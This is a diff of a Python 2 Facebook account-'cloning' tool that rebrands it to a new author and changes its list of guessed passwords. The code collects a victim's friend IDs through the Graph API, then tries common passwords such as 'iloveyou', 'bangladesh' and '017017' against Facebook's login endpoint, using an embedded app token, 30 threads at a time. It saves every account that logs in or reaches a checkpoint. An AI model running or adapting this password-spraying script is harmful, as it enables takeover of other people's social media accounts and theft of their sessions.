@@ -48,16 +48,21 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[1;98m   _____   __     ______     ______     ______    
-\033[1;97m /\__  _\ /\ \   /\  ___\   /\  ___\   /\  == \   
-\033[1;95m \/_/\ \/ \ \ \  \ \ \__ \  \ \  __\   \ \  __<   
-\033[1;94m    \ \_\  \ \_\  \ \_____\  \ \_____\  \ \_\ \_\ 
-\033[1;93m     \/_/   \/_/   \/_____/   \/_____/   \/_/ /_/ 
-\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║
-\033[1;96m    ║✯ 𝕮𝖗𝖊𝖆𝖙𝖔𝖗  𝕸𝖗.𝕽𝖆𝖓𝖆 𝕬𝖆𝖍𝖎𝖑               ║    
-\033[1;98m    ║✯ 𝖄𝖔𝖚𝖙𝖚𝖇𝖊 ☪ Aahil Creations            ║  
-\033[1;96m    ║✯ 𝕴𝖒 𝖓ø𝖙 𝖗𝖊𝖘𝖕𝖔𝖓𝖘𝖎𝖇𝖑𝖊 𝖋𝖔𝖗 𝖆𝖓𝖞 𝖒𝖎𝖘𝖘 𝖚𝖘𝖊  ║
-\033[1;91m    ║══▒═💀═▒═💀═▒═══¤═¤═¤════════════¤═══¤═══¤═══║"""
+\033[1;97m ……..…../´¯/)……….. (\¯`\
+…………/….//……….. …\\….\
+………../….//………… ….\\….\
+…../´¯/…./´¯\………../¯ `\….\¯`\
+.././…/…./…./.|_……_| .\….\….\…\.\..
+(.(….(….(…./.)..)..(..(. \….)….)….).)
+.\…………….\/…/….\. ..\/……………./
+..\…………….. /……..\……………..…/
+….\…………..(………. ..)……………./
+   
+\033[1;97m Author: Mehedi Hasan Maruf
+\033[1;95m Dhaka Bangladesh
+\033[1;94m No Haress Normal Users   
+\033[1;93m Enjoy My Tool     
+  
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -75,29 +80,20 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-\033[1;97m************************************************
-\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE MR AAHIL ~
-\033[1;97m************************************************
-
-\033[1;95m____─▄───────▄█▄───────▄─ Stay Home 💓
-\033[1;95m____▐█▌──▄──█████──▄──▐█▌ Stay Safe 💓
-\033[1;95m____─█──███▄▄███▄▄███──█─ 
-\033[1;95m____░█░░█▄█▄█▀▒▀█▄█▄█░░█░ 
-\033[1;95m____██▄▄█▄█▄█▒▒▒█▄█▄█▄▄██ 
+\033[1;95m│▒│ /▒/
+│▒│/▒/
+│▒ /▒/─┬─┐
+│▒│▒|▒│▒│
+┌┴─┴─┐-┘─┘
+│▒┌──┘▒▒▒│
+└┐▒▒▒▒▒▒┌┘
+└┐▒▒▒▒┌┘
 """
-jalan("\033[1;92m              _    _     _ ")             
-jalan("\033[1;92m             | |  (_)   | |")             
-jalan("\033[1;92m  _ __   __ _| | ___ ___| |_ __ _ _ __  ZINDABAD✔ ") 
-jalan("\033[1;97m | '_ \ / _` | |/ / / __| __/ _` | '_ \ ")
-jalan("\033[1;97m | |_) | (_| |   <| \__ \ || (_| | | | |")
-jalan("\033[1;92m | .__/ \__,_|_|\_\_|___/\__\__,_|_| |_|")
-jalan("\033[1;92m | | ")                                   
-jalan("\033[1;92m |_| ")
 
 
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "mehedi"
+CorrectPassword = "hasan"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
@@ -257,7 +253,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m•◈•══════•◈•\033[1;91mBlackTiger\033[1;97m•◈•══════•◈•"
+		print "\033[1;97m•◈•══════•◈•\033[1;91mMaruf\033[1;97m•◈•══════•◈•"
 		jalan('\033[1;91mGetting IDs \033[1;91m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -267,7 +263,6 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;92m•◈•══════••◈•\033[1;91mBlackTiger\033[1;95m•◈•══════••◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -295,7 +290,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m●══════════════════◄►══════════════════●"
 
-	jalan('           \033[1;91mAahil start cloning Wait...')
+	jalan('           \033[1;91mmehedi start cloning Wait...')
 	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
 
 	def main(arg):
@@ -374,7 +369,7 @@ def pilih_super():
 				                           cek.close()
 				                           cekpoint.append(user+pass3)									
 					               else:										
-						           pass4 = b['first_name'] + 'khan'											
+						           pass4 = 'iloveyou'											
 			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                   q = json.load(data)												
 			                                   if 'access_token' in q:		
@@ -396,7 +391,7 @@ def pilih_super():
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
 					                           else:									
-						                       pass5 = '786786'							
+						                       pass5 = 'bangladesh'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
 						                       if 'access_token' in q:	
@@ -418,7 +413,7 @@ def pilih_super():
 				                                                   cek.close()
 				                                                   cekpoint.append(user+pass5)					
 						                               else:								
-							                           pass6 = 'Pakistan'											
+							                           pass6 = 'indian'											
 			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                           q = json.load(data)												
 			                                                           if 'access_token' in q:	
@@ -462,7 +457,7 @@ def pilih_super():
 				                                                                           cek.close()
 				                                                                           cekpoint.append(user+pass7)           					
 								                                       else:						
-										                           pass8 = b['last_name'] + '786'											
+										                           pass8 = '017017'											
 			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
 			                                                                                   q = json.load(data)												
 			                                                                                   if 'access_token' in q:		
@@ -484,7 +479,7 @@ def pilih_super():
 				                                                                                       cek.close()
 				                                                                                       cekpoint.append(user+pass8)   	
 										                                   else:					
-										                                       pass9 = b['first_name'] + '786'					
+										                                       pass9 = 'facebook'					
 										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
 										                                       q = json.load(data)				
 										                                       if 'access_token' in q:		
@@ -513,9 +508,8 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackTiger\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By Rana Aahil--•◈•---»" #Dev:Rana
-	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Tiger.py)↩\033[1;97m....'
+	print "  \033[1;91m«---•◈•---Developed By Mehedi Hasan Maruf--•◈•---»" #Dev:Rana
+	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 maruf.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  ____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
@@ -538,10 +532,10 @@ _______¶¶¶_________¶______¶_________¶¶¶______
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;91m ....Aahil Creations....... \033[1;95m :
+: \033[1;91m ....Mehedi Vau....... \033[1;95m :
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;91m Aahil"""
+              \033[1;91m Mehedi"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
